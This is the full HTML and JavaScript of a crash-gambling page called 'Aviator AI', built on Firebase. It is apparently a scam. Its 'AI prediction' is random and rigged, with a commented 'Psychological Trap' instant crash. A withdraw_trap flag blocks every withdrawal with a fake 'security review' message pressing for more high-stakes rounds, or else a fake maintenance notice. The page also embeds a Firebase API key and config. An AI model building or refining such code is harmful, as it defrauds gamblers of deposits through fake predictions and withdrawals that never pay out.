<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator AI - Neon Minimalist</title>
    <style>
        :root { --primary: #e91e63; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
        
        /* Navbar */
        .nav { background: #1b1c1d; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; }
        .bal-display { color: var(--gold); font-weight: bold; font-size: 1.2rem; background: #000; padding: 5px 15px; border-radius: 20px; border: 1px solid var(--gold); }

        /* Predictor Widget */
        .predictor-box { background: rgba(0,0,0,0.8); border: 2px solid var(--neon); border-radius: 15px; width: 180px; margin: 20px auto; padding: 10px; box-shadow: 0 0 15px var(--neon); }
        #next-pred { font-size: 2.2rem; color: var(--neon); font-weight: 900; text-shadow: 0 0 10px var(--neon); }

        /* Game Board - NO PLANE, ONLY LINE */
        #game-container { position: relative; width: 95%; max-width: 700px; height: 350px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border: 1px solid #333; border-radius: 10px; overflow: hidden; }
        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; transition: 0.1s; }
        canvas { display: block; }

        /* Control Panel */
        .controls { background: #1b1c1d; width: 95%; max-width: 700px; margin: 15px auto; padding: 25px; border-radius: 20px; box-sizing: border-box; }
        input { background: #000; color: #fff; border: 1px solid #444; padding: 12px; width: 120px; text-align: center; font-size: 1.2rem; border-radius: 8px; margin-bottom: 15px; }
        .btn-bet { width: 100%; padding: 20px; font-size: 1.8rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; transition: 0.3s; background: #28a745; color: white; }
        .cashout { background: #ff9800 !important; transform: scale(0.98); }
        
        /* Modal */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .m-content { background: #1b1c1d; padding: 40px; border-radius: 25px; width: 350px; border: 1px solid #444; }
    </style>
</head>
<body>

    <div class="nav">
        <div style="font-weight:900; color:var(--primary); font-size: 1.5rem;">AVIATOR AI</div>
        <div class="bal-display">৳ <span id="balance">0.00</span></div>
        <button onclick="openWd()" style="background:#444; color:white; border:none; padding:10px 15px; border-radius:8px; cursor:pointer;">Withdraw</button>
    </div>

    <div class="predictor-box">
        <div style="font-size: 0.7rem; letter-spacing: 2px;">AI PREDICTION</div>
        <div id="next-pred">SCANNING</div>
    </div>

    <div id="game-container">
        <div id="multiplier">1.00x</div>
        <canvas id="gameCanvas"></canvas>
    </div>

    <div class="controls">
        <input type="number" id="betAmt" value="20" min="20" max="20000">
        <button id="actionBtn" class="btn-bet">BET</button>
    </div>

    <div id="wdModal" class="modal">
        <div class="m-content">
            <h2 style="color:var(--primary)">Withdrawal Error</h2>
            <p id="errorMsg">Your account is under security review. Please complete 5 more high-stakes rounds to unlock.</p>
            <button onclick="closeWd()" style="width:100%; padding:15px; background:#333; color:white; border:none; border-radius:10px;">Got it</button>
        </div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyBrMOmNOmopMwh35MFs8_u99LbroeLu_4s",
        authDomain: "avaitor-game-c3d80.firebaseapp.com",
        databaseURL: "https://avaitor-game-c3d80-default-rtdb.firebaseio.com",
        projectId: "avaitor-game-c3d80",
        storageBucket: "avaitor-game-c3d80.firebasestorage.app",
        messagingSenderId: "1021690556103",
        appId: "1:1021690556103:web:07407ca44089d0be3d98e2"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const userRef = ref(db, 'users/user_01');

    let balance = 0, isTrap = true, isFlying = false, startTime, currentBet = 0;
    let predSignal = 0, actualCrash = 0;

    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 700; canvas.height = 350;

    // --- Firebase Sync ---
    onValue(userRef, (s) => {
        const d = s.val();
        if(d) {
            balance = d.balance;
            isTrap = d.withdraw_trap;
            document.getElementById('balance').innerText = balance.toFixed(2);
        }
    });

    // --- Auto Signal Generation (The Core Logic) ---
    function setupRound() {
        // Predictor value generate korbe
        predSignal = (Math.random() * (8.00 - 1.15) + 1.15).toFixed(2);
        
        // 95% Match, 5% Instant Crash Trap
        if (Math.random() > 0.05) {
            actualCrash = predSignal;
        } else {
            actualCrash = 1.00; // Psychological Trap: Instant Crash
        }

        document.getElementById('next-pred').innerText = predSignal + "x";
        document.getElementById('multiplier').style.color = "white";
        document.getElementById('multiplier').innerText = "1.00x";
        ctx.clearRect(0, 0, canvas.width, canvas.height);
    }

    setupRound(); // Start first signal

    function drawNeonLine(elapsed) {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.beginPath();
        ctx.strokeStyle = "#e91e63";
        ctx.lineWidth = 6;
        ctx.lineCap = "round";
        ctx.shadowBlur = 15;
        ctx.shadowColor = "#e91e63";

        ctx.moveTo(0, canvas.height);
        // Exponential Curve Drawing
        let x = elapsed * 100;
        let y = canvas.height - (Math.pow(elapsed, 1.5) * 30);
        ctx.lineTo(x, y);
        ctx.stroke();
    }

    function animate() {
        if (!isFlying) return;
        let elapsed = (Date.now() - startTime) / 1000;
        let currentVal = (1 + Math.pow(elapsed, 1.4) * 0.15).toFixed(2);
        
        document.getElementById('multiplier').innerText = currentVal + "x";
        drawNeonLine(elapsed);

        if (parseFloat(currentVal) >= actualCrash) {
            isFlying = false;
            finishRound();
        } else {
            requestAnimationFrame(animate);
        }
    }

    function finishRound() {
        const multiElem = document.getElementById('multiplier');
        multiElem.style.color = "#ff0040";
        multiElem.innerText = actualCrash <= 1.00 ? "INSTANT CRASH!" : "FLEW AWAY!";
        
        setTimeout(() => {
            const btn = document.getElementById('actionBtn');
            btn.innerText = "BET";
            btn.className = "btn-bet";
            setupRound(); // AUTO CHANGE SIGNAL IMMEDIATELY
        }, 2500);
    }

    document.getElementById('actionBtn').onclick = function() {
        if(!isFlying) {
            let amt = parseFloat(document.getElementById('betAmt').value);
            if(balance < amt) return alert("Insufficient Balance!");
            
            balance -= amt;
            update(userRef, {balance});
            currentBet = amt; isFlying = true; startTime = Date.now();
            this.innerText = "CASH OUT";
            this.className = "btn-bet cashout";
            animate();
        } else {
            // User Cashed Out
            let winMulti = parseFloat(document.getElementById('multiplier').innerText);
            let winAmt = currentBet * winMulti;
            balance += winAmt;
            update(userRef, {balance});
            isFlying = false;
            alert("SUCCESS! You Won ৳" + winAmt.toFixed(2));
            // Line remains until actual crash
        }
    };

    window.openWd = () => {
        if(isTrap) document.getElementById('wdModal').style.display = 'flex';
        else alert("Withdrawal system maintenance. Try again later.");
    };
    window.closeWd = () => document.getElementById('wdModal').style.display = 'none';

</script>
</body>
</html>